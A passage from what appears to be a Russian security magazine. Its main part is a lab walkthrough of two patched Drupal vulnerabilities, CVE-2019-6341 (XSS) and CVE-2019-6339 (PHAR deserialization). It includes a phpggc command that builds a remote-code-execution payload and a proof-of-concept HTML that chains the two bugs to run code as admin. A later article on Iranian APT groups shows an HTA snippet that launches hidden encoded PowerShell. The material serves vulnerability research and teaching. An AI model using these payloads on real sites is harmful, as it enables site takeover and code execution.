к аэропорту дрон автоматичес ки приземляется или стре мится облететь его.
  По замыслу спец служб эта мера должна надежно защитить особо важных
персон от неожиданной ата ки с воздуха. И подоб ные опасения, следует
отметить, не лишены оснований: например, в прошлом году для покушения
(неудавшегося) на президента Венесуэлы Николаса Мадуро злоумышленники
начинили взрывчаткой беспилотник. А в Сирии боевики уже давно используют
дешевые дроны для атак на объекты военной инфраструктуры. С другой сто‐
роны, в том же Гатвике коп теры зло умышленни ков часами летали над взлет‐
но‐посадочными полосами и рулежными дорожками и при этом прекрасно
себя чувствовали…
  Примечательно, что сто имость программируемых радиопередатчиков,
с помощью которых можно заглушить или подделать GPS‐сигнал, сегодня
относительно невелика и составляет всего лишь нес колько сотен долларов,
а купить все необходимое можно в интернете. Тем более даже для «профес‐
сиональных» коптеров чрез мерно мощные глу шилки совершенно излишни:
известны случаи, когда большие дроны вроде Phantom «терялись» вблизи
антенн базовых станций мобильных операто ров или высоковольтных линий
ЛЭП. Если коптер попадет в зону действия подобной глу шилки, он с большой
долей вероятности нач нет дрейфовать по ветру, а из‐за отсутс твия сигнала
с навигационных спутников не сможет правиль но опре делить свое текущее
местоположение, чтобы вернуть ся в точку вылета. Дальше, как говорится,
возможны варианты.


ВЫВОДЫ
Так можно ли все‐таки угнать дрон? Как видим, можно, техничес ки для этого
не существует непреодолимых преград. Одна ко все  зависит, конечно,
от самого устрой ства, от используемо го им ПО и протоколов передачи дан‐
ных. Как бы то ни было, среди всех высокотехнологичных ухищрений обычная
рогатка зачастую оказывается намного более эффективной в борьбе с коп‐
терами — нужно лишь подобрать пра виль ный с аэродинамичес кой точки зре‐
ния булыжник.
ВЗЛОМ
 КОМБО
      DRUPAL  ДЛЯ





              КАК ЗАХВАТИТЬ
             САЙТ С DRUPAL,
            ИСПОЛЬЗУЯ НОВЫЕ
                      aLLy
                     ONsec                      @iamsecurity   УЯЗВИМОСТИ





В этой статье я расскажу о двух уязвимостях в популярной
CMS Drupal. Одна из них связана с архивами PHAR, не осо‐
бенно страшна и работа ет толь ко с пра вами админа, но если
подключить другую (XSS), то такой дуэт становится уже очень
опасным для любого сайта на незапатченном Drupal. Мы
подробно раз берем, как работают обе и откуда они взялись.


Итак, интересный случай XSS связан с тем, что разработчики не учли отдель‐
ные особенности работы некоторых функций PHP с кодировкой UTF‐8. Из‐за
особенностей работы preg_replace ата кующий может  загрузить файл,
содержащий HTML/JS‐код, при переходе на который он будет выполнен
в контексте браузера пользователя.


             INFO

                      Эта уязвимость получила номер CVE‐2019‐6341,
                       ее  обнаружил  Сэм  Томас  (Sam  Thomas).
                     Под угрозой оказались все версии ветки Drupal
                         8.6 до 8.6.13, Drupal 8.5 до 8.5.14 и Drupal
                     7 до 7.65.


Вторая уязвимость — unserialize при помощи архи ва PHAR. Отсутствие про‐
верки пути до временной директории дает возможность использовать врап‐
пер phar://. В конце прошлого года я рас ска зывал об эксплуатации десери‐
ализации через архивы PHAR в форуме phpBB. В Drupal тоже есть воз‐
можность загрузки файлов и атакующий может заг рузить картинку, содер‐
жащую полезную нагрузку. Затем указать путь до нее в качестве вре менной
директории, используя поток phar, что приведет к выпол нению произволь‐
ного кода.


             INFO

                       Речь идет о CVE‐2019‐6339. Ей подвержены все
                       версии   Drupal   8.6   ниже   8.6.6,   Drupal
                         8.5 ниже 8.5.9 и Drupal 7 ниже 7.62. Уязвимость
                     была найдена Грегом Кнад дисоном (Greg Knaddi‐
                         son) из Drupal Security Team и Сэмом Томасом
                     (Sam Thomas).



СТЕНД
Чтобы воспроизвести уяз вимость, нам понадобят ся два контей нера Docker.
Первый — для сервера базы данных.


$ docker run ‐d ‐e MYSQL_USER="drupal" ‐e MYSQL_PASSWORD="6zbd9Ilfka"
 ‐e MYSQL_DATABASE="drupal" ‐‐rm ‐‐name=mysql ‐‐hostname=mysql mysql/
mysql‐server:5.7

Второй — официальный, от разработчиков Drupal, с последней уяз вимой
к обоим багам версией — 8.6.5.


$ docker run ‐d ‐‐rm ‐p80:80 ‐‐link=mysql ‐‐name=drupalvh ‐‐hostname=
drupalvh drupal:8.6.5

Теперь нужно прой ти несложную процеду ру инсталляции.





                        Ус тановка Drupal 8.6.5

Если требуется отладка, то я по‐прежнему рекомендую использовать Php‐
Storm и расширение Xdebug helper для браузера. Эта связ ка работает быстро
и стабильно. Чтобы иметь воз можность дебага, я допол нительно установлю
PHP‐расширение Xdebug.


$ docker exec ‐ti drupalvh /bin/bash
$ pecl install xdebug‐2.6.1
$ echo "zend_extension=/usr/local/lib/php/extensions/
no‐debug‐non‐zts‐20170718/xdebug.so" > /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_enable=1" >> /usr/local/etc/php/conf.d/
php‐xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /usr/local/etc/php/conf.
d/php‐xdebug.ini
$ service apache2 reload

Не забудь поменять IP‐адрес 192.168.99.1 на свой и обрати внимание на путь
до скомпилированной библиотеки xdebug.so. Далее нужно скачать исходни‐
ки Drupal, и после перезаг рузки конфигов Apache мож но запус кать отладчик.
  После завер шения установки CMS необходимо будет создать тестовую
страницу или запись.





                 Создание тестовой записи в Drupal

Помимо этого, для тес тирова ния XSS понадобится любой пользователь,
который сможет загружать файлы и оставлять комментарии. В дефолтной
инсталляции это можно делать после прохождения регис трации. Как вариант,
можешь просто создать юзера в админке.


ПУТЬ К XSS
Начнем с межсайтового скрип тинга. У поль зователей Drupal есть воз‐
можность комментировать записи. И, как и в любой современной CMS, в ком‐
ментариях можно использовать базовую разметку. Функция, которая нам
интересна, — это добавление картинок.





     Добавление картинок в форме комментирования записи в Drupal

Причем картинка загружается с компьютера пользователя. Имена загружа‐
емых файлов могут представлять опас ность, одна из пос ледних уязвимостей
в WordPress тому пример.
  За сохранение загруженных файлов отвечает функция _file_save_u‐
pload_single.


core/modules/file/file.module
function _file_save_upload_single(\SplFileInfo $file_info, $form_f
ield_name, $validators = [], $destination = FALSE, $replace = FILE_E
XISTS_RENAME) {
  ...
  $file‐>destination = file_destination($destination . $file‐>getFil
ename(), $replace);

Обрати внимание на аргумент $replace. Он отвечает за ситу ацию, когда
в директории уже присутствует файл с таким же именем, как у загружаемого.
По дефолту новый файл переименовывается.


core/includes/file.inc
function file_destination($destination, $replace) {
  if (file_exists($destination)) {
    switch ($replace) {
      ...
      case FILE_EXISTS_RENAME:
        $basename = drupal_basename($destination);
        $directory = drupal_dirname($destination);
        $destination = file_create_filename($basename, $directory);
        ...
  return $destination;

Функция file_create_filename генерирует новое имя для загружаемого
файла. Но перед этим производится санитизация названия. Убираются все
нежелательные символы.


core/includes/file.inc
function file_create_filename($basename, $directory) {
  ...
  $basename = preg_replace('/[\x00‐\x1F]/u', '_', $basename);
  if (substr(PHP_OS, 0, 3) == 'WIN') {
    // These characters are not allowed in Windows filenames
    $basename = str_replace([':', '*', '?', '"', '<', '>', '|'], '_',
 $basename);
  }

Функция preg_replace заменяет на символ подчеркивания (_) все символы
с ASCII‐кодом до 31 (1F). И все бы ничего, если бы не PCRE‐модификатор u
(PCRE_UTF8). Он интерпретиру ет входные данные как строку UTF‐8. Допус‐
тимая длина символа UTF‐8 — от одного до четырех байт. UTF‐8 спроекти‐
рован с учетом обратной совместимости с набором символов ASCII. Поэтому
в диапазоне однобайтовых кодов (0x00—0x7F) ASCII и UTF‐8 пересекаются.
  При работе функций preg_* с этой кодировкой есть небольшая особен‐
ность: если переданная строка имеет некорректный формат, то результатом
работы будет NULL, а выполнение кода продолжится. Об этом четко написано
в документации — см. справку по модификатору u.
   Чтобы понять, как сделать строку невалидной, обратимся к спе цификации
по UTF‐8 — RFC 3629. Согласно этому документу, байты C0, C1, F5‐FF никог‐
да не должны присутство вать в корректной строке в кодировке UTF‐8.





            Спецификация по UTF‐8. Некорректные байты

Вооружившись этой информа цией, я на кидал тестовый скрипт, чтобы про‐
верить особенность обработки невалидных строк.


test.php
<?php
$basename = "a\xFFnything";
print("Before: ".$basename.PHP_EOL);
$basename = preg_replace('/[\x00‐\x1F]/u', '_', $basename);
print("After: ".array_flip(get_defined_constants(true)['pcre'])[
preg_last_error()]);





  Особенность обработ ки некорректных строк UTF‐8 функцией
  preg_replace

Теперь посмотрим, что произойдет, когда мы передадим некорректную стро‐
ку UTF‐8. Для этого нам нужно сна чала загрузить файл с кодом символа \xFF
в качестве названия и одним из раз решенных расширений, я использовал
png.





              Загрузка файла, содержащего символы UTF‐8

Я поставил брейк‐пой нт на функцию file_create_filename и повторил зап‐
рос. В самом начале происходит вызов preg_replace, после которого
переменная $basename становится null.





      Повторная загрузка файла, содержащего те же символы UTF‐8


core/includes/file.inc
// A URI or path may already have a trailing slash or look like
"public://"
if (substr($directory, ‐1) == '/') {
  $separator = '';
}
else {
  $separator = '/';
}


$destination = $directory . $separator . $basename;

Дальше формируется полный путь до заг руженного файла ($destination),
а так как $basename у нас пустая, то путь будет указывать просто на папку
с загруженными файлами. Разумеется, эта директория существу ет, поэтому
дальше мы попадаем в тело усло вия.





   Формирование пути, по которо му будет сохранен загруженный файл


core/includes/file.inc
if (file_exists($destination)) {

Тут к имени файла добавляется суффикс, по сути, это просто счетчик.


core/includes/file.inc
// Destination file already exists, generate an alternative
  $pos = strrpos($basename, '.');
  if ($pos !== FALSE) {
    $name = substr($basename, 0, $pos);
    $ext = substr($basename, $pos);
  }
  else {
    $name = $basename;
    $ext = '';
  }


  $counter = 0;
  do {
    $destination = $directory . $separator . $name . '_' . $counter++
 . $ext;
  } while (file_exists($destination));
}





         Добавление суффикса к имени загружа емого фай ла



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            DRUPAL  КОМБО ДЛЯ
           КАК ЗАХВАТИТЬ САЙТ С DRUPAL, ИСПОЛЬЗУЯ
                         НОВЫЕ УЯЗВИМОСТИ




В итоге получается путь /var/www/html/sites/default/files/inline‐im‐
ages/_0. По нему и сохраняется содержимое файла.





                Содержимое загруженного файла


КАК ЖЕ ЭТО МОЖНО ИСПОЛЬЗОВАТЬ?
Сервер возвращает содержимое загруженных фай лов без заголовка Con‐
tent‐Type, а современные браузеры пытаются определить тип содержимого
автоматически. Такое поведение и поз волит провес ти XSS‐атаку. Для этого
достаточно загрузить код на JS.
   Дальше используем еще одну возможность в комментариях — ссылки.
Формируем ссылку на загруженный файл с XSS.


<a href="/sites/default/files/inline‐images/_0" type="text/html">
Click here</a>

Теперь администратору дос таточно перейти по ссылке, и код будет выпол‐
нен.





                  Успешная XSS‐ата ка на Drupal 8.6.5

Кстати, необязательно использовать заг рузку картинок через комментарии.
Для тех же целей можно приспособить наз начение аватара в профиле поль‐
зователя. В этом случае путь будет немного другим: /sites/default/files/
pictures/<ГГГГ‐ММ>/.


ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
Давай теперь посмотрим на другую проб лему — PHAR‐десериализацию.
В панели администратора есть раздел File system. Там можно задать папку
для хранения временных файлов (Temporary directory), а также время их жиз‐
ни.





             Настрой ки путей временных фай лов в Drupal

При сохранении данных формы сра баты вает функция system_check_direc‐
tory, которая проверя ет существование ука занной директории и наличие
необходимых прав на нее.


core/modules/system/system.module
function system_check_directory($form_element, FormStateInterface
$form_state) {
  $directory = $form_element['#value'];
  if (strlen($directory) == 0) {
    return $form_element;
  }


  $logger = \Drupal::logger('file system');
  if (!is_dir($directory) && !drupal_mkdir($directory, NULL, TRUE)) {

Здесь отсутствует проверка введенных данных и можно указать враппер
phar:// и путь до PHAR‐архива с полезной нагрузкой. Любая функция,
которая поддерживает работу с потока ми, может триггерить уязвимость.
  Для генерации я воспользуюсь клас сной утилитой phpggc. В ней есть
джентльменский набор гаджетов для популярных фреймворков, CMS и раз‐
личных библиотек. Список пос тоянно пополняется.
   Drupal использует библиотеку Guzzle, в которой есть извес тная цепочка
гаджетов, ведущая к RCE.





            Список доступных гаджетов в утилите phpggc


/drupal-8.6.5/vendor/guzzlehttp/guzzle/CHANGELOG.md
# CHANGELOG


## 6.3.0 ‐ 2017‐06‐22

Выбираем гаджет Guzzle/RCE1. Здесь ты сра зу можешь сгенерировать архив
PHAR, указав ключ ‐p и имя архива через ‐o.


./phpggc ‐p phar Guzzle/RCE1 system ls ‐o rce.phar

Далее переименовываем rce.phar в rce.png и загружаем на сервер как кар‐
тинку. Если теперь указать путь до файла через врап пер PHAR в качес тве вре‐
менной папки, то пейлоад отра бота ет и код выполнится.


phar://./sites/default/files/inline‐images/rce.png





    Указанный путь попада ет в функцию is_dir без какой‐либо фильтрации





        Успешная эксплуата ция RCE в Drupal через PHAR Unserialize


ОБЪЕДИНЯЕМ АТАКИ В ЦЕПОЧКУ
Чтобы получить окончательный вектор ата ки, нужно объ единить XSS и RCE
от администратора.
  Сначала загружаем архив PHAR с полезной нагрузкой как PNG и запоми‐
наем путь до него. Далее нам понадобится код на JavaScript, который будет
подгружать от админа стра ницу с нас тройками и отправлять форму. В ней
в качестве file_temporary_path будет указан путь до архива.
   Скрипт должен будет получать ответ от сервера. Чтобы легче его парсить,
я поместил результат работы команды ls ‐l в тег <shell>.


./phpggc ‐p phar ‐o rce.phar Guzzle/RCE1 system "echo \<shell\>; ls
‐l; echo \</shell\>"


poc.html
<html>
<head></head>
<body>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/
jquery.min.js" type="text/javascript"></script>
    <script>
        var filepath = 'phar://./sites/default/files/inline‐images/
system.png';
        var form_url = '/admin/config/media/file‐system';
        var form_id = 'system_file_system_settings';
        $.get(form_url, function(data) {
            form_build_id = $(data).find('[name="form_build_id"]').
val();
            var postdata = {
                'file_temporary_path': filepath,
                'form_id': form_id,
                'form_build_id': form_build_id
            }
            $.post(form_url, postdata, function (data) {
                alert($(data).last().text());
                console.log($(data).last().text());
            });
        });
    </script>
</body>
</html>

Загружаем этот код через первую уяз вимость. Теперь остается только зас‐
тавить администратора перейти по нужной ссылке. Но это уже совсем другая
история.





                    Эксплуата ция RCE через XSS


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
В статье я рассмотрел очередную интерес ную цепочку, ведущую от XSS
к RCE. Таких вариантов ата ки в последнее время встречается все больше.
  На данный момент обе уяз вимости были исправлены. Чтобы исключить
возможность исполь зования враппера phar и архивов PHAR, команда раз‐
работки Drupal добавила кастомные обработчики для потоков phar://.





              Патч для уяз вимости PHAR Unserialize в Drupal

XSS продержалась немного дольше, и патч для нее вышел в марте этого года.
Разработчики добавили компонент Unicode, который имеет метод valida‐
teUtf8 для проверки стро ки на соответствие стандартам UTF‐8. Так что сле‐
ди за новостями безопасности и вовремя обновляй свои продукты!
ВЗЛОМ

 КИБЕРВОЙНЫ
 ПЕРСИДСКОГО ЗАЛИВА





         КАК ИРАНСКИЕ ХАКЕРЫ
        ОБРАТИЛИ ИНТЕРНЕТ
      ПРОТИВ ЕГО СОЗДАТЕЛЕЙ





В мае‐июне 2019 года произошли утечки
секретных  данных,  проливающие  свет
на недав ние кибератаки неизвестных групп.
Сопоставив  их  с  отчетами  аналитиков
из CyberSky, FireEye, Cisco Talos и Syman‐              84ckf1r3                                                                                         84ckf1r3@gmail.com
tec, можно выделить три хакерские группы,
явно действу ющие в интересах пра витель‐
ства Ирана. Они регулярно атакуют сети
крупных компаний США и их партне ров
на Ближнем Востоке, нанося чувствитель‐
ный урон против нику его же оружием. Рас‐
смотрим  подробнее  их  инструментарий
и общую стратегию.


Развитие национальных подразделений информационной безопас ности Ира‐
на было простимулировано агрессивной полити кой США. Дипломати ческие
отношения эти страны официально разорвали с 1980 года. С тех пор они
действуют по правилам необъявленной войны: шпи онаж, регулярные про‐
вокации и диверсии вместо открытого про тивос тояния. Интернет существен‐
но расширил возможности раз ведки, поз воляя достигать поставленных целей
при минимальном риске.
  В 2010 году спецслужбы США и Изра иля провели совместную операцию
против ядерной программы Ира на. Червь Stuxnet получил контроль над АСУ
ТП и вывел из строя око ло тысячи центрифуг для обогаще ния урана. Это пос‐
лужило мощным стимулом для ответных действий. Иранское правительство
быстро осознало, что интернет и физичес кий мир ста ли тесно связаны, а вот
причастность конкретных лиц к ата кам через глобаль ную сеть доказать очень
трудно.
   Если раньше иранская разведка в основном занималась радиоперех‐
ватом, то после памятного инцидента переключилась на интернет. Крупные
реформы начались в 2011 году. На базе Департамента технологий и инно‐
ваций Министерства информации Ирана (MOIS) было создано киберподраз‐
деление RANA — аналог американского USCYBERCOM.
  Уже к 2013 году, по оценкам израильского Института исследований
национальной безопасности, Иран обладал сущес твенным потенциалом,
позволяющим проводить кибератаки против Израиля, США, Саудовской Ара‐
вии, Катара и других монархий Персидского залива. В 2015 году аме рикан‐
ская корпорация Defense Technology в своем докладе называет Иран одной
из пяти главных угроз кибербезопасности.
  Ситуация обострилась осенью 2017 года, когда Трамп откры то саботи‐
ровал «ядерную сделку» с Ираном (JCPOA). Официальный выход из нее США
состоял ся в мае 2018 года — именно тогда наб людалась мощ ная вол на
сетевых атак из Ирана.
  По мнению западных ана литиков, сейчас иранские правительственные
хакеры находятся под непосредственным контролем подразде ления РЭБ
и информационной безопас ности КСИР (IRGC JANGAL), которое подчиня‐
ется Верховному совету по киберпространс тву (Supreme Council of Cyber‐
space) при Высшем совете национальной безопасности (Supreme Council
of Security).
   Так ли это в действительности — неизвестно. Как и любая разведка, иран‐
ская часто распространяет дезин форма цию. Одна ко перечисленные ниже
группы явно действуют в интересах исламской республики.


           WARNING

                      Вся информация в этой статье предоставлена
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный дан ными материала ми.



APT33
Эта группа занимается кибершпионажем как минимум последние шесть лет,
а  с  2017  года  она  прицельно  ата кует  меж дународные  компании
со штаб‐квартирами в США, Южной Корее и Саудовской Аравии. Основные
цели — аэрокосмичес кие, энергетические и нефтехимичес кие концерны.
Возможно, APT33 также извес тна как MuddyWater или тесно сотрудни чает
с этой хакерской группой.
  На первом этапе группа APT33 всегда использует таргетированный
фишинг. Сотрудникам целевых компаний рас сылаются тщательно подоб‐
ранные по темам и оформлению электронные письма, содержащие вре‐
доносное  вложение.  Обычно  это  приложение  формата  HTA  (HTML
Application), которое содержит JS‐ или VB‐скрипты. Фишка в том, что оно
выпол няется в Windows без каких‐либо проверок. Более того, оно не откры‐
вается в браузе ре, а запускается как отдель ный процесс через Microsoft
HTML Application Host и системную библиотеку mshtml.dll. Поэтому все нас‐
тройки безопасности браузера ока зываются бесполезны.
   Чтобы письма выглядели убедитель но, APT33 зарегистрировала несколь‐
ко доменов с именами, похожими на названия авиационных компаний
из Саудовской Аравии и их западных партнеров из сферы технического
обслуживания. Среди них были поддельные адреса Boeing, Northrop Grum‐
man, Alsalam Aircraft, Saudia Aerospace Engineering Industries и их совместных
предприятий.
  Досталось и гражданским авиакомпаниям. Под удар попали AirAsia, Thai
Airways, Flydubai и Etihad Airways, которых ата кова ли через предварительно
скомпрометированные акка унты сотрудников по протоколам RDP (Windows)
и ICA (Citrix Remote PC).
  Для усыпления бдитель ности при открытии .hta жертве отображалась акту‐
альная информация по теме письма. Например, реальные ссылки на вакан‐
сии  для  специалистов  определенного  профиля.  Переходили  по  ним
или нет — неважно. Вредонос ные скрипты тихо выполнялись до прорисовки
контента, собирая информа цию о компь юте ре жертвы и подготавливая плац‐
дарм для следующих этапов атаки.
  Пример скрытого запус ка скрипта в HTA:


<script>
a=new ActiveXObject("WScript.Shell");
a.run('%windir%\\System32\\cmd.exe /c powershell ‐window hidden ‐enc
<encoded command>' 0);
</script>

Метод run объекта WScript.Shell используется для запуска внешних при‐
ложений через сервер сценариев Windows (Windows Script Host). В данном
случае запускается отдельное консольное приложение со скры тым окном,
которое автоматически завершает ся пос ле выполнения (ключ /c). Для сок‐
рытия другого окна в этом примере задается нулевое значение параметра
intWindowStyle (указано в конце скрип та перед закрывающей скобкой).
   Итогом просмотра вредоносного пись ма APT33 часто становил ся запуск
трояна‐дроппера DropShot. В качестве боевой нагрузки затем использовался
бэкдор TurnedUp — отдельно или вместе с вайпером ShapeShift, также извес‐
тным как StoneDrill. Он мог стирать файлы определенных типов, удалять
отдельные разделы или форматировать накопи тели целиком.
  В коде вайпера были обна ружены слова на языке фарси (официальный
язык Ирана). Еще более характерный след — время проведения атак. Оно
совпадает с летним временем Ирана (+04:30 UTC) и специфической рабочей
неделей этой страны (с суб боты по среду). В четверг государственные
учреждения обыч но закрыты. Дополнительно на Иран указывают исполь‐
зованные в начале атак DNS‐серверы и тот факт, что все специфические инс‐
трументы (включая Alfa Shell) сначала обнаруживались на иранских теневых
форумах.
   Если успешно атакованный компьютер представлял интерес как плацдарм
для подготовки дальнейших атак, то вмес то уничтожения данных на нем внед‐
рялся шелл, в частности Alfa Shell.





                    Ин терфейс Alfa Shell v.2

Этот многофункциональный хакерский инс трумент использовался для про‐
должения атаки уже из локальной сети целевой компании. С него отправ‐
лялись фишинговые письма вышестоящим сот рудникам, сканировались пор‐
ты, искались уязвимости и так далее.





            Составление фишингового письма из Alfa Shell

Иногда вместо Alfa Shell на компь ютер жертвы внедрялась известная «крыса»
NanoCore за авторством Тейлора Хадлстона, ныне отбывающего тюремный
срок в Хот‐Спрингс. Функциональность этого бэкдора расширялась плагина‐
ми, а сам он не обнаруживался антивиру сами из‐за того, что его компоненты
были зашифрованы. Отдельные модули также были защищены методами сте‐
ганографии (выглядели как изображения PNG). Декриптор не представлял
угрозы с точки зрения поведенческого ана лиза, а сигнатур долгое вре мя
не было.





                Стра ница нас троек плагинов NanoCore

Поверхностный анализ про цес сов не позволял с ходу выявить NanoCore, пос‐
кольку он маскировался среди системных (использовался инжект .dll). Трафик
на первый взгляд тоже казался безобидным — обмен пакетами происходил
с узлами microsoftupdated.com и managehelpdesk.com, в реальности ока‐
завшимися C&C‐серверами.
  После ареста Хадлстона в середи не 2017 года APT33 переключилась
на внедрение кейлоггера NetWire, чьи модификации применяются до сих пор.
Его основное назначение — перехват клавиатурных нажатий в поис ках
паролей и другой конфиденциальной информа ции, однако воз можность уста‐
новить обратный прокси превращает NetWire в универсальный бэкдор.





                     Ин терфейс NetWire

Он выполняет разведку и сбор пользовательских данных, после чего загружа‐
ет их на C&C‐сервер и ждет от него дальнейшие команды. NetWire использует
собственный  алгоритм шифрования  данных,  а  затем  отправляет  их
как лог‐файл.
  Дополнительно  в  NetWire  применя ется  обфускация,  чтобы  скрыть
от защитных программ сбор паролей и дру гой конфиденциальной информа‐
ции. Все технологии предотвращения утечек используют статистический ана‐
лиз, который оказывается бесполезным, если конфиденциальные данные
предварительно разбива ются на час ти и переда ются по разным каналам.
   Легкость портирования NetWire привела к тому, что его стали применять
и в тех случаях, когда на целевых компьютерах была установлена Linux
или macOS, но в большинс тве случаев троян проникал в корпоративную сеть
именно через «окна».
  В феврале 2019 года техника дос тавки NetWire целевым компьютерам
на платформе Windows изменилась. Была зарегистрирована масштабная
фишинговая кампания с внедрением кода через PowerShell и .NET Framework.
  Особенность в том, что сценарий PS может заг рузить с произвольного
URL сборку .NET непосредственно в память PowerShell и сразу выполнить ее
в контексте процесса, не соз давая PE‐файлы на диске.
  В ходе недавней фишинговой ата ки сотрудни кам авиакомпаний пред‐
лагалось открыть с Google.Disk VB‐скрипт. Благода ря длинному названию
и измененной иконке он выглядел как презентация нового самолета, тех‐
нические характеристики известной модели или дру гие важные документы.
Облачный сервис хранения позволил обойти пра вила файрвола и нас тройки
браузера, блокирующие загрузки с сай тов, име ющих низ кую репутацию.
   Дальнейшая попытка открыть скрипт вызыва ла предупрежде ние о том, что
его создатель не может быть проверен, одна ко боль шинство пользователей
просто игнорировали это предупреждение и разрешали запуск вручную.
  Код скачанного VB‐скрипта был обфусцирован за счет час той конверсии
hex‐bin и использования множества переменных. Он запускал сце нарий Pow‐
erShell, который загружал с www.paste.ee другой VB‐скрипт. Этот сайт был
выбран из‐за использования TLS (невоз можно проверить зашифрованный
трафик).





  Фрагмент обфусцированного PS‐сценария с заг рузкой дочернего
  скрипта

Если присмотришься к это му фрагменту кода, то увидишь, что в сценарии PS
используются готовые методы .NET Framework. В при мере выше исполь‐
зовали метод Load из дот нетовско го клас са System.Reflection.Assembly.
Так хакеры смогли получить доступ к его элементам из PowerShell аналогично
тому, как это делается в C#.
  Интеграция .NET с PowerShell особенно привлекательна для злоумыш‐
ленников, поскольку традиционные средс тва безопасности не умеют ана‐
лизировать такую связку. Они проверяют только наличие потенциально опас‐
ных команд в сценариях PS и отдельно контролируют процессы .NET во время
их выполнения.
   Скрипт идентифицирует уста новленную вер сию .NET Framework и исполь‐
зует ее позже для динамичес кого определения пути к рабочему каталогу.
Декодированная сборка дроппера переда ется в метод Load в качес тве аргу‐
мента, и полученный экземпляр клас са сохраня ется как переменная. Далее
через нее происходит обра щение к зашифрованным объ ектам дроппера.
  На финальном этапе атаки использует ся метод R и расшифрованный тро‐
ян NetWire инжектируется в дотнетовский консоль ный процесс Installer
tool (InstallUtil.exe). Как же он это делает?
   Когда вызывается метод R, автоматически запус кается InstallUtil.exe
в режиме ожидания. Блоки памяти приоста новленного процес са переза‐
писываются боевой нагрузкой, код которой передается в качестве аргумента
методу R. Как результат — поведенческие ана лизаторы молчат, трояна
не видно в списке запущенных про цес сов, а механизм его попадания
на компьютер крайне трудно восстановить при анализе логов.
   Распространению трояна помогало и то, что второй скрипт копировался
в \Appdata\Roaming. Этот каталог служит для син хронизации настроек при‐
ложений и прочих пользовательских данных между разными устройствами.
Поэтому, когда пользователь с доменной учеткой авторизуется на дру гом
компьютере той же локальной сети, вредоносный VB‐скрипт автоматически
копируется и на него тоже.


APT34 (AKA OILRIG)
В отличие от большинства хакерских групп, APT34 в своей стратегии редко
использует методы социальной инженерии. Она ориентируется на уязвимос‐
ти в массовом ПО, которые дают возможность удаленно выполнить про‐
извольный код без сложного взаимодействия с пользователем.
   Эта группа действует на Ближнем Вос токе с 2014 года, в основном атакуя
государственные учреждения региональных противников Ирана, их финан‐
совые и телекоммуникационные компании. APT34 хорошо финансиру ется,
о чем свидетельствует применение бэкдора собственной раз работки и быс‐
трая реакция на появление уязвимостей.
  Пожалуй,  самая  сложная  и  многоэтапная  атака  была  устроена
APT34 в ноябре 2017 года вскоре пос ле того, как Microsoft устранила кри‐
тическую уязвимость CVE‐2017‐11882 в Oﬃce. Менее чем через неделю, ког‐
да еще не были опубликова ны подробности, а большинс тво организаций
не успело установить патч, APT34 успешно применила соответствующий экс‐
плоит.
   Схема внедрения бэкдора была сложной и позволила обойти традици‐
онные средства защиты, вклю чая репутационный и поведенческий анализ.
Следи за руками…





  Схема заражения бэкдором, использованная APT34. Источник:
  ﬁreeye.com

К началу 2018 года сети правитель ственных учреждений в Саудовской Аравии
и ряде других стран оказались заражены через письмо с вложением в фор‐
мате RTF. Антивирусы его игнориро вали, так как сигнатуры еще не было,
а эвристический эмулятор не обна руживал ничего подозрительного.
  Файл .rtf открывался в MS Word, и Word (посколь ку в нем были формулы)
автоматически запускал входящий в состав MS Oﬃce редактор формул
eqnedt32.exe. На момент ата ки он содержал ошиб ку обработки объ ектов
в памяти, позволяв шую удаленно выполнить про извольный код с правами
текущего пользователя.
   Благодаря технологии OLE редактор формул дос тупен из всех документов
MS Oﬃce. При вызове он создает ся как отдельный процесс и раньше не про‐
верял длину данных на входе, поэто му через него легко было вызывать
переполнение стека.
   «Ну и что? — скажешь ты. — Windows давно раз мещает процес сы в слу‐
чайных адре сах оперативки, поэто му толку от перепол нения стека — ноль.
Хакер не знает, куда попадет его код».
  Фишка в том, что eqnedt32.exe — очень старый компонент. Он был ском‐
пилирован еще в те времена, когда никакой рандомизации размещения
адресного пространства (ASLR) в Windows не было. Поэтому редактор фор‐
мул MS Oﬃce всегда загружался по одним и тем же адре сам и заботливо раз‐
мещал по фиксированному адресу «боевую наг рузку» вмес то слишком длин‐
ных уравнений.
  Редактор формул вызывал из kernel32.dll функцию WinExec, через
которую от име ни текущего пользователя запускался дочерний процесс msh‐
ta.exe (см. Microsoft HTML Application Host в опи сании техник другой груп‐
пы — APT33). Он загружал с удаленного узла вре доносный VB‐скрипт
под видом текстового файла (все *.txt обычно исклю чены из проверки ради
ее ускорения).
  Далее у скачанного файла менялось расширение с .txt на .vbs, и он
запускался на исполнение как локально созданный скрипт, обходя репута‐
ционный анализ.
  На следующем шаге этот VB‐скрипт создавал по адресу %SystemDrive%\
ProgramData\Windows\Microsoft\java\ два файла в кодировке Base64:
hUpdateCheckers.base и dUpdateCheckers.base — плюс батник cUpdate‐
Checkers.bat и еще один скрипт с безобидным наз ванием GoogleUp‐
dateschecker.vbs.





  Фрагмент основного VB‐скрипта, соз дающего дочерние компоненты
  для внедрения бэкдора

Далее основной скрипт использовал стандартную утилиту командной строки
CertUtil.exe для декодирования Base64 и сохранял результат в виде пары
сценариев PowerShell. Они также выглядели как локально созданные текущим
пользователем и не вызыва ли подоз рения у защит ных программ.
  Файл cUpdateCheckers.bat создавал в планировщике заданий автомати‐
ческий запуск GoogleUpdateschecker.vbs и запус кал дальнейшие процеду‐
ры  после  паузы  в  пять  секунд,  а  затем  батник  и  закодированные
в Base64 файлы удалялись основным скриптом.
  На финальном этапе из первого сценария PowerShell запускался тро‐
ян‐дроппер BondUpdater, который использовал процедуру генерации псев‐
дослучайных доменных имен (DGA) для соеди нения с управляющим сер‐
вером. DGA сильно осложня ла блокировку C&C‐серверов, поскольку все их
альтернативные име на было невозможно вычислить, не зная алгоритма.
  После получения отклика троян запус кал из вто рого PS‐сценария бэкдор
PowRuner и сообщал ему текущий адрес C&C. С этого момента зараженный
компьютер полностью контро лировался APT34 уда ленно.
  Интересно, что в 2017–2018 годах российская хакерская группа Turla
использовала зараженные APT34 компьюте ры для распространения собс‐
твенных вре доносных программ, включая модификации на базе разработок
